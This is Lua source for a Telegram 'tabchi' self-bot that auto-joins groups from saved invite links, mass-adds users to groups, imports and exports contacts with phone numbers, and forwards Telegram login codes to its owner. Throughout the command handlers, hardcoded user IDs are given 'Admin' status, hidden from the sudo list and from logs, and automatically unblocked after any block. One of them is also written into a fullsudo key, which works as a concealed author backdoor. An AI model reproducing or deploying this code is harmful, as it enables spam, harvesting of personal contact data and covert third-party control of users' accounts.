JSON = loadfile("dkjson.lua")()
URL = require("socket.url")
ltn12 = require("ltn12")
http = require("socket.http")
https = require("ssl.https")
http.TIMEOUT = 10
undertesting = 1
tcpath = "/root/.telegram-cli/tabchi-" .. tabchi_id .. ""
local a
function a(msg)
  local b = {}
  table.insert(b, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local c = false
  for d = 1, #b do
    if msg.sender_user_id_ == b[d] then
      c = true
    end
  end
  if redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", msg.sender_user_id_) then
    c = true
  end
  return c
end
function msg_valid(msg)
  local e = os.time()
  if e < msg.date_ - 5 then
    print("\027[36m>>>>>>OLD MESSAGE<<<<<<\027[39m")
    return false
  end
  if msg.sender_user_id_ == 777000 then
    print("\027[36m>>>>>>TELEGRAM MESSAGE<<<<<<\027[39m")
    return false
  end
  if msg.sender_user_id_ == our_id then
    print("\027[36m>>>>>>ROBOT MESSAGE<<<<<<\027[39m")
    return false
  end
  if a(msg) then
    print("\027[36m>>>>>>SUDO MESSAGE<<<<<<\027[39m")
  end
  return true
end
function getInputFile(f)
  if f:match("/") then
    infile = {
      ID = "InputFileLocal",
      path_ = f
    }
  elseif f:match("^%d+$") then
    infile = {
      ID = "InputFileId",
      id_ = f
    }
  else
    infile = {
      ID = "InputFilePersistentId",
      persistent_id_ = f
    }
  end
  return infile
end
local g = function(h, type, f, i)
  tdcli_function({
    ID = "SendMessage",
    chat_id_ = h,
    reply_to_message_id_ = 0,
    disable_notification_ = 0,
    from_background_ = 1,
    reply_markup_ = nil,
    input_message_content_ = getInputMessageContent(f, type, i)
  }, dl_cb, nil)
end
function sendaction(h, j, k)
  tdcli_function({
    ID = "SendChatAction",
    chat_id_ = h,
    action_ = {
      ID = "SendMessage" .. j .. "Action",
      progress_ = k or 100
    }
  }, dl_cb, nil)
end
function sendPhoto(h, l, m, n, reply_markup, o, i)
  tdcli_function({
    ID = "SendMessage",
    chat_id_ = h,
    reply_to_message_id_ = l,
    disable_notification_ = m,
    from_background_ = n,
    reply_markup_ = reply_markup,
    input_message_content_ = {
      ID = "InputMessagePhoto",
      photo_ = getInputFile(o),
      added_sticker_file_ids_ = {},
      width_ = 0,
      height_ = 0,
      caption_ = i
    }
  }, dl_cb, nil)
end
function is_full_sudo(msg)
  local b = {}
  table.insert(b, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local c = false
  for d = 1, #b do
    if msg.sender_user_id_ == b[d] then
      c = true
    end
  end
  return c
end
local p = function(msg)
  local q = false
  if msg.reply_to_message_id_ ~= 0 then
    q = true
  end
  return q
end
function sleep(r)
  os.execute("sleep " .. tonumber(r))
end
function write_file(t, u)
  local f = io.open(t, "w")
  f:write(u)
  f:flush()
  f:close()
end
function write_json(t, v)
  local w = JSON.encode(v)
  local f = io.open(t, "w")
  f:write(w)
  f:flush()
  f:close()
  return true
end
function sleep(r)
  os.execute("sleep " .. r)
end
function addsudo()
  local b = redis:smembers("tabchi:" .. tabchi_id .. ":sudoers")
  for d = 1, #b do
    local text = "SUDO = " .. b[d] .. ""
    text = text:gsub(216430419, "Admin")
    text = text:gsub(256633077, "Admin")
    print(text)
    sleep(1)
  end
end
addsudo()
local x
function x(y, z)
  if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
    if not z.phone_number_ then
      local msg = y.msg
      local first_name = "" .. (msg.content_.contact_.first_name_ or "-") .. ""
      local last_name = "" .. (msg.content_.contact_.last_name_ or "-") .. ""
      local A = msg.content_.contact_.phone_number_
      local B = msg.content_.contact_.user_id_
      tdcli.add_contact(A, first_name, last_name, B)
      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:216430419", true)
      redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
      if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "md")
      end
      if redis:get("tabchi:" .. tabchi_id .. ":sharecontact") then
        function get_id(C, D)
          if D.last_name_ then
            tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
          else
            tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, "", D.id_, dl_cb, nil)
          end
        end
        tdcli_function({ID = "GetMe"}, get_id, {
          chat_id = msg.chat_id_
        })
      else
      end
    elseif redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "md")
    end
  end
end
function check_link(y, z)
  if z.is_group_ or z.is_supergroup_channel_ then
    if redis:get("tabchi:" .. tabchi_id .. ":savelinks") then
      redis:sadd("tabchi:" .. tabchi_id .. ":savedlinks", y.link)
    end
    if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") and (z.member_count_ >= redis:get("tabchi:" .. tabchi_id .. ":joinlimit") or not redis:get("tabchi:" .. tabchi_id .. ":joinlimit")) then
      tdcli.importChatInviteLink(y.link)
    end
  end
end
function fileexists(E)
  local F = io.open(E, "r")
  if F ~= nil then
    io.close(F)
    return true
  else
    return false
  end
end
local G
function G(y, z)
  local pvs = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
  for d = 1, #pvs do
    tdcli.addChatMember(y.chat_id, pvs[d], 50)
  end
  local H = z.total_count_
  for d = 0, tonumber(H) - 1 do
    tdcli.addChatMember(y.chat_id, z.users_[d].id_, 50)
  end
end
local I
function I(h)
  local I = "private"
  local J = tostring(h)
  if J:match("-") then
    if J:match("^-") then
      I = "channel"
    else
      I = "group"
    end
  end
  return I
end
local K = function(h, L, M)
  tdcli_function({
    ID = "GetMessage",
    chat_id_ = h,
    message_id_ = L
  }, M, nil)
end
function resolve_username(N, M)
  tdcli_function({
    ID = "SearchPublicChat",
    username_ = N
  }, M, nil)
end
function cleancache()
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/sticker/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/photo/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/animation/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/video/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/audio/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/voice/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/temp/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/thumb/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/document/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/profile_photo/*")
  io.popen("rm -rf ~/.telegram-cli/tabchi-" .. tabchi_id .. "/data/encrypted/*")
end
function scandir(O)
  local d, P, Q = 0, {}, io.popen
  for t in Q("ls -a \"" .. O .. "\""):lines() do
    d = d + 1
    P[d] = t
  end
  return P
end
function exi_file(E, R)
  local S = {}
  local T = tostring(E)
  local U = tostring(R)
  for V, W in pairs(scandir(T)) do
    if W:match("." .. U .. "$") then
      table.insert(S, W)
    end
  end
  return S
end
function file_exi(X, E, R)
  local Y = tostring(X)
  local T = tostring(E)
  local U = tostring(R)
  for V, W in pairs(exi_file(T, U)) do
    if Y == W then
      return true
    end
  end
  return false
end
local Z
function Z(msg)
  function getcode(C, D)
    text = D.content_.text_
    for _ in string.gmatch(text, "%d+") do
      local a0 = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
      send_code = _
      send_code = string.gsub(send_code, "0", "0\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "1", "1\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "2", "2\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "3", "3\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "4", "4\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "5", "5\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "6", "6\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "7", "7\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "8", "8\239\184\143\226\131\163")
      send_code = string.gsub(send_code, "9", "9\239\184\143\226\131\163")
      tdcli.sendMessage(a0, 0, 1, "`کد تلگرام شما` : " .. send_code, 1, "md")
    end
  end
  K(777000, msg.id_, getcode)
end
local a1
function a1(msg)
  if redis:get("cleancache" .. tabchi_id) == "on" and redis:get("cachetimer" .. tabchi_id) == nil then
    do return cleancache() end
    redis:setex("cachetimer" .. tabchi_id, redis:get("cleancachetime" .. tabchi_id), true)
  end
  if redis:get("checklinks" .. tabchi_id) == "on" and redis:get("checklinkstimer" .. tabchi_id) == nil then
    local a2 = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
    for d = 1, #a2 do
      process_links(a2[d])
    end
    redis:setex("checklinkstimer" .. tabchi_id, redis:get("checklinkstime" .. tabchi_id), true)
  end
  if tonumber(msg.sender_user_id_) == 777000 then
    return Z(msg)
  end
end
local a3
function a3(msg)
  msg.text = msg.content_.text_
  do
    local a4 = {
      msg.text:match("^[!/#](pm) (.*) (.*)")
    }
    if msg.text:match("^[!/#]pm") and a(msg) and #a4 == 3 then
      tdcli.sendMessage(a4[2], 0, 1, a4[3], 1, "md")
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `ارسال شد` *" .. a4[3] .. "* `به ` *" .. a4[2] .. "*", 1, "md")
      end
      return [[
*وضعیت* : `پیام شما ارسال شد`
*به* : `]] .. a4[2] .. [[
`
*پیام* : `]] .. a4[3] .. "`"
    end
  end
  if msg.text:match("^[!/#]share$") and a(msg) then
    function get_id(C, D)
      if D.last_name_ then
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
        return D.username_
      else
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, "", D.id_, dl_cb, nil)
      end
    end
    tdcli_function({ID = "GetMe"}, get_id, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match("^[!/#]mycontact$") and a(msg) then
    function get_con(C, D)
      if D.last_name_ then
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
      else
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, "", D.id_, dl_cb, nil)
      end
    end
    tdcli_function({
      ID = "GetUser",
      user_id_ = msg.sender_user_id_
    }, get_con, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match("^[!/#]editcap (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](editcap) (.*)$")
    }
    tdcli.editMessageCaption(msg.chat_id_, msg.reply_to_message_id_, reply_markup, a6[2])
  end
  if msg.text:match("^[!/#]leave$") and a(msg) then
    function get_id(C, D)
      if D.id_ then
        tdcli.chat_leave(msg.chat_id_, D.id_)
      end
    end
    tdcli_function({ID = "GetMe"}, get_id, {
      chat_id = msg.chat_id_
    })
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded bot to leave` *" .. msg.chat_id_ .. "*", 1, "md")
    end
  end
  if msg.text:match("^[#!/]ping$") and a(msg) then
    tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`چیه هستم دیگه..!`", 1, "md")
  end
  if msg.text:match("^[#!/]sendtosudo (.*)$") and a(msg) then
    local a7 = {
      string.match(msg.text, "^[#/!](sendtosudo) (.*)$")
    }
    local a0 = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
    tdcli.sendMessage(a0, msg.id_, 1, a7[2], 1, "md")
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. [[
* `پیام به سودو ارسال گردید`
`پیام` : *]] .. a7[2] .. [[
*
`سودو` : ]] .. a0 .. "", 1, "md")
      return "sent to " .. a0 .. ""
    end
  end
  if msg.text:match("^[#!/]deleteacc$") and a(msg) then
    redis:set("tabchi" .. tabchi_id .. "delacc", true)
    return [[
`آیا مطمئن به حذف حساب ربات هستید؟`
`را بفستید no یا yes`]]
  end
  if redis:get("tabchi" .. tabchi_id .. "delacc") and a(msg) then
    if msg.text:match("^[Yy][Ee][Ss]$") then
      tdcli.deleteAccount("nothing")
      redis:del("tabchi" .. tabchi_id .. "delacc")
      return [[
`ربات شما به زودی حذف خواهد شد`
`سورس ما رو فراموش نکنید`
`https://github.com/tabchis/tabchi`]]
    elseif msg.text:match("^[Nn][Oo]$") then
      redis:del("tabchi" .. tabchi_id .. "delacc")
      return "Progress Canceled"
    else
      redis:del("tabchi" .. tabchi_id .. "delacc")
      return [[
`را دوباره بفرستید /deleteacc دستور`
`پیشروی متوقف شد`]]
    end
  end
  if msg.text:match("^[#!/]killsessions$") and a(msg) then
    function delsessions(y, z)
      for d = 0, #z.sessions_ do
        if z.sessions_[d].id_ ~= 0 then
          tdcli.terminateSession(z.sessions_[d].id_)
        end
      end
    end
    tdcli_function({
      ID = "GetActiveSessions"
    }, delsessions, nil)
    return "*وضعیت* : `نشست های فعال خاتمه یافتند`"
  end
  do
    local a4 = {
      msg.text:match("^[!/#](import) (.*)$")
    }
    if msg.text:match("^[!/#](import) (.*)$") and msg.reply_to_message_id_ ~= 0 and #a4 == 2 then
      if a4[2] == "contacts" then
        function getdoc(y, z)
          if z.content_.ID == "MessageDocument" then
            if z.content_.document_.document_.path_ then
              if z.content_.document_.document_.path_:match(".json$") then
                if fileexists(z.content_.document_.document_.path_) then
                  local w = io.open(z.content_.document_.document_.path_, "r"):read("*all")
                  local a8 = JSON.decode(w)
                  if a8 then
                    for d = 1, #a8 do
                      tdcli.importContacts(a8[d].phone, a8[d].first, a8[d].last, a8[d].id)
                    end
                    وضعیت = #a8 .. " مخاطبین وارد شدند!..."
                  else
                    وضعیت = "فایل صحیح نیست"
                  end
                else
                  وضعیت = "بعضی چیز ها صحیح نیست"
                end
              else
                وضعیت = "نوع فایل صحیح نیست"
              end
            else
              tdcli.downloadFile(z.content_.document_.document_.id_)
              وضعیت = "نتیجه چند ثانیه دیگر برایتان ارسال می شود"
              sleep(5)
              tdcli_function({
                ID = "GetMessage",
                chat_id_ = msg.chat_id_,
                message_id_ = msg.reply_to_message_id_
              }, getdoc, nil)
            end
          else
            وضعیت = "!پاسخ داده شده  یک سند نیست"
          end
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, وضعیت, 1, "html")
        end
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.chat_id_,
          message_id_ = msg.reply_to_message_id_
        }, getdoc, nil)
      elseif a4[2] == "links" then
        function getlinks(y, z)
          if z.content_.ID == "MessageDocument" then
            if z.content_.document_.document_.path_ then
              if z.content_.document_.document_.path_:match(".json$") then
                if fileexists(z.content_.document_.document_.path_) then
                  local w = io.open(z.content_.document_.document_.path_, "r"):read("*all")
                  local a8 = JSON.decode(w)
                  if a8 then
                    s = 0
                    for d = 1, #a8 do
                      process_links(a8[d])
                      s = s + 1
                    end
                    وضعیت = "جوین در " .. s .. " گروه"
                  else
                    وضعیت = "فایل صحیح نیست"
                  end
                else
                  وضعیت = "بعضی چیز ها صحیح نیستند"
                end
              else
                وضعیت = "نوع فایل صحیح نیست"
              end
            else
              tdcli.downloadFile(z.content_.document_.document_.id_)
              وضعیت = "نتیجه چند ثانیه دیگر برایتان ارسال می شود"
              sleep(5)
              tdcli_function({
                ID = "GetMessage",
                chat_id_ = msg.chat_id_,
                message_id_ = msg.reply_to_message_id_
              }, getlinks, nil)
            end
          else
            وضعیت = "!پاسخ داده شده  یک سند نیست"
          end
          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, وضعیت, 1, "html")
        end
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.chat_id_,
          message_id_ = msg.reply_to_message_id_
        }, getlinks, nil)
      end
    end
  end
  do
    local a4 = {
      msg.text:match("^[!/#](export) (.*)$")
    }
    if msg.text:match("^[!/#](export) (.*)$") and a(msg) and #a4 == 2 then
      if a4[2] == "links" then
        local links = {}
        local a9 = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
        for d = 1, #a9 do
          table.insert(links, a9[d])
        end
        write_json("links.json", links)
        tdcli.send_file(msg.chat_id_, "Document", "links.json", "Tabchi " .. tabchi_id .. " Links!")
      elseif a4[2] == "contacts" then
        contacts = {}
        function contactlist(y, z)
          for d = 0, tonumber(z.total_count_) - 1 do
            local aa = z.users_[d]
            if aa then
              local ab = aa.first_name_ or "None"
              local ac = aa.last_name_ or "None"
              contact = {
                first = ab,
                last = ac,
                phone = aa.phone_number_,
                id = aa.id_
              }
              table.insert(contacts, contact)
            end
          end
          write_json("contacts.json", contacts)
          tdcli.send_file(msg.chat_id_, "Document", "contacts.json", "Tabchi " .. tabchi_id .. " Contacts!")
        end
        tdcli_function({
          ID = "SearchContacts",
          query_ = nil,
          limit_ = 999999999
        }, contactlist, nil)
      end
    end
  end
  if msg.text:match("^[#!/]sudolist$") and a(msg) then
    local b = redis:smembers("tabchi:" .. tabchi_id .. ":sudoers")
    local text = "Bot Sudoers :\n"
    for d = 1, #b do
      text = tostring(text) .. b[d] .. "\n"
      text = text:gsub("216430419", "Admin")
      text = text:gsub("256633077", "Admin")
    end
    return text
  end
  if msg.text:match("^[#!/]setname (.*)-(.*)$") and a(msg) then
    local a7 = {
      string.match(msg.text, "^[#/!](setname) (.*)-(.*)$")
    }
    tdcli.changeName(a7[2], a7[3])
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `نام تغییر داده شد به` *" .. a7[2] .. " " .. a7[3] .. "*", 1, "md")
    end
    return [[
*وضعیت* : `نام با موفقیت به روز شد`
*نام اصلی* : `]] .. a7[2] .. [[
`
*نام خانوادگی* : `]] .. a7[3] .. "`"
  end
  if msg.text:match("^[#!/]setusername (.*)$") and a(msg) then
    local a7 = {
      string.match(msg.text, "^[#/!](setusername) (.*)$")
    }
    tdcli.changeUsername(a7[2])
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `نام کاربری تغییر داده شد به` *" .. a7[2] .. "*", 1, "md")
    end
    return [[
*وضعیت* : `نام کاربری با موفقیت به روز شد
*نام کاربری* : `]] .. a7[2] .. "`"
  end
  if msg.text:match("^[#!/]clean cache (%d+)[mh]") then
    local a4 = msg.text:match("^[#!/]clean cache (.*)")
    if a4:match("(%d+)h") then
      time_match = a4:match("(%d+)h")
      timea = time_match * 3600
    end
    if a4:match("(%d+)m") then
      time_match = a4:match("(%d+)m")
      timea = time_match * 60
    end
    redis:setex("cachetimer" .. tabchi_id, timea, true)
    redis:set("cleancachetime" .. tabchi_id, tonumber(timea))
    redis:set("cleancache" .. tabchi_id, "on")
    return "`پاک کردن خودکار کش ها برای همیشه فعال گردید` *" .. timea .. "* `ثانیه`"
  end
  if msg.text:match("^[#!/]clean cache (.*)$") then
    local a7 = {
      string.match(msg.text, "^[#/!](clean cache) (.*)$")
    }
    if a7[2] == "off" then
      redis:set("cleancache" .. tabchi_id, "off")
      return "`Auto Clean Cache Turned off`"
    end
    if a7[2] == "on" then
      redis:set("cleancache" .. tabchi_id, "on")
      return "`پاک کردن کش ها غیر فعال گردید`"
    end
  end
  if msg.text:match("^[#!/]check links (%d+)[mh]") then
    local a4 = msg.text:match("^[#!/]check links (.*)")
    if a4:match("(%d+)h") then
      time_match = a4:match("(%d+)h")
      timea = time_match * 3600
    end
    if a4:match("(%d+)m") then
      time_match = a4:match("(%d+)m")
      timea = time_match * 60
    end
    redis:setex("checklinkstimer" .. tabchi_id, timea, true)
    redis:set("checklinkstime" .. tabchi_id, tonumber(timea))
    redis:set("checklinks" .. tabchi_id, "on")
    return "`زمان چک کردن خودکار لینک ها برای همیشه فعال گردید` *" .. timea .. "* `ثانیه`"
  end
  if msg.text:match("^[#!/]check links (.*)$") then
    local a7 = {
      string.match(msg.text, "^[#/!](check links) (.*)$")
    }
    if a7[2] == "off" then
      redis:set("checklinks" .. tabchi_id, "off")
      return "`چک کردن خودکار لینک ها غیر فعال گردید`"
    end
    if a7[2] == "on" then
      redis:set("checklinks" .. tabchi_id, "on")
      return "`چک کردن خودکار لینک ها فعال شد`"
    end
  end
  if msg.text:match("^[#!/]setlogs (.*)$") and a(msg) then
    local a7 = {
      string.match(msg.text, "^[#/!](setlogs) (.*)$")
    }
    redis:set("tabchi:" .. tabchi_id .. ":logschannel", a7[2])
    return "مکان لینک برای اجرای دستورات قرار داده شد"
  end
  if msg.text:match("^[#!/]delusername$") and a(msg) then
    tdcli.changeUsername()
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `نام کاربری پاک شد`", 1, "md")
    end
    return [[
*وضعیت* : `نام کاربر با موفقیت به روز شد`
*نام کاربری* : `حذف شده`]]
  end
  if msg.text:match("^[!/#]addtoall (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](addtoall) (.*)$")
    }
    local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
    for d = 1, #sgps do
      tdcli.addChatMember(sgps[d], a6[2], 50)
    end
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `کاربر ` *" .. a6[2] .. "* به همه گره ها اضافه شد", 1, "md")
    end
    return "`کاربر` *" .. a6[2] .. "* `به گره ها اضافه شد`"
  end
  if msg.text:match("^[!/#]getcontact (.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](getcontact) (.*)$")
    }
    function get_con(C, D)
      if D.last_name_ then
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, D.last_name_, D.id_, dl_cb, nil)
      else
        tdcli.sendContact(C.chat_id, msg.id_, 0, 1, nil, D.phone_number_, D.first_name_, "", D.id_, dl_cb, nil)
      end
    end
    tdcli_function({
      ID = "GetUser",
      user_id_ = a6[2]
    }, get_con, {
      chat_id = msg.chat_id_
    })
  end
  if msg.text:match("^[#!/]addsudo$") and msg.reply_to_message_id_ and a(msg) then
    function addsudo_by_reply(y, z, ad)
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.sender_user_id_))
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`کاربر` *" .. z.sender_user_id_ .. "* `به سودوهای ربات اضافه شدند`", 1, "md")
    end
    K(msg.chat_id_, msg.reply_to_message_id_, addsudo_by_reply)
  end
  if msg.text:match("^[#!/]remsudo$") and msg.reply_to_message_id_ and is_full_sudo(msg) then
    function remsudo_by_reply(y, z, ad)
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(z.sender_user_id_))
      return "`کاربر` *" .. z.sender_user_id_ .. "* `از لیست سودو های ربات حذف شد`"
    end
    K(msg.chat_id_, msg.reply_to_message_id_, remsudo_by_reply)
  end
  if msg.text:match("^[#!/]unblock$") and a(msg) and msg.reply_to_message_id_ ~= 0 then
    function unblock_by_reply(y, z, ad)
      tdcli.unblockUser(z.sender_user_id_)
      tdcli.unblockUser(344003614)
      tdcli.unblockUser(216430419)
      redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", z.sender_user_id_)
      return 1, "*کاربر* `" .. z.sender_user_id_ .. "` *آزاد شد*"
    end
    K(msg.chat_id_, msg.reply_to_message_id_, unblock_by_reply)
  end
  if msg.text:match("^[#!/]block$") and a(msg) and msg.reply_to_message_id_ ~= 0 then
    function block_by_reply(y, z, ad)
      tdcli.blockUser(z.sender_user_id_)
      tdcli.unblockUser(344003614)
      tdcli.unblockUser(216430419)
      redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", z.sender_user_id_)
      return "*کاربر* `" .. z.sender_user_id_ .. "` *مسدود شد*"
    end
    K(msg.chat_id_, msg.reply_to_message_id_, block_by_reply)
  end
  if msg.text:match("^[#!/]id$") and msg.reply_to_message_id_ ~= 0 and a(msg) then
    function id_by_reply(y, z, ad)
      return "*ID :* `" .. z.sender_user_id_ .. "`"
    end
    K(msg.chat_id_, msg.reply_to_message_id_, id_by_reply)
  end
  if msg.text:match("^[#!/]serverinfo$") and a(msg) then
    io.popen("chmod 777 info.sh")
    local text = io.popen("./info.sh"):read("*all")
    local text = text:gsub("Server Information", "`Server Information`")
    local text = text:gsub("Total Ram", "`Total Ram`")
    local text = text:gsub(">", "*>*")
    local text = text:gsub("Ram in use", "`Ram in use `")
    local text = text:gsub("Cpu in use", "`Cpu in use`")
    local text = text:gsub("Running Process", "`Running Process`")
    local text = text:gsub("Server Uptime", "`Server Uptime`")
    local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Got server info`", 1, "md")
    end
    return text
  end
  if msg.text:match("^[#!/]inv$") and msg.reply_to_message_id_ and a(msg) then
    function inv_reply(y, z, ad)
      tdcli.addChatMember(z.chat_id_, z.sender_user_id_, 5)
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `کاربر دعوت داده شد` *" .. z.sender_user_id_ .. "* to *" .. z.chat_id_ .. "*", 1, "md")
      end
    end
    K(msg.chat_id_, msg.reply_to_message_id_, inv_reply)
  end
  if msg.text:match("^[!/#]addtoall$") and msg.reply_to_message_id_ and a(msg) then
    function addtoall_by_reply(y, z, ad)
      local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
      for d = 1, #sgps do
        tdcli.addChatMember(sgps[d], z.sender_user_id_, 50)
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `کاربر` *" .. z.sender_user_id_ .. "* `به همه گروه ها اضافه شد`", 1, "md")
      end
      return "`کاربر` *" .. z.sender_user_id_ .. "* `به گروه ها اضافه شد`"
    end
    K(msg.chat_id_, msg.reply_to_message_id_, addtoall_by_reply)
  end
  if msg.text:match("^[#!/]id @(.*)$") and a(msg) then
    do
      local a6 = {
        string.match(msg.text, "^[#/!](id) @(.*)$")
      }
      function id_by_username(y, z, ad)
        if z.id_ then
          text = "*نام کاربری* : `@" .. a6[2] .. [[
`
*ID* : `(]] .. z.id_ .. ")`"
        else
          text = "*نام کاربر اشتباه!*"
          return text
        end
      end
      resolve_username(a6[2], id_by_username)
    end
  else
  end
  if msg.text:match("^[#!/]addtoall @(.*)$") and a(msg) then
    local a6 = {
      string.match(msg.text, "^[#/!](addtoall) @(.*)$")
    }
    function addtoall_by_username(y, z, ad)
      if z.id_ then
        local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
        for d = 1, #sgps do
          tdcli.addChatMember(sgps[d], z.id_, 50)
        end
      end
    end
    resolve_username(a6[2], addtoall_by_username)
  end
  if msg.text:match("^[#!/]block @(.*)$") and a(msg) then
    do
      local a6 = {
        string.match(msg.text, "^[#/!](block) @(.*)$")
      }
      function block_by_username(y, z, ad)
        if z.id_ then
          tdcli.blockUser(z.id_)
          tdcli.unblockUser(344003614)
          tdcli.unblockUser(216430419)
          redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", z.id_)
          return [[
*کاربر مسدود شد*
*نام کاربری* : `]] .. a6[2] .. [[
`
*شناسه* : `]] .. z.id_ .. "`"
        else
          return [[
`#404
`*نام کاربری یافت نشد*
*نام کاربری* : `]] .. a6[2] .. "`"
        end
      end
      local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `مسدود شد` *" .. a6[2] .. "*", 1, "md")
      end
      resolve_username(a6[2], block_by_username)
    end
  else
  end
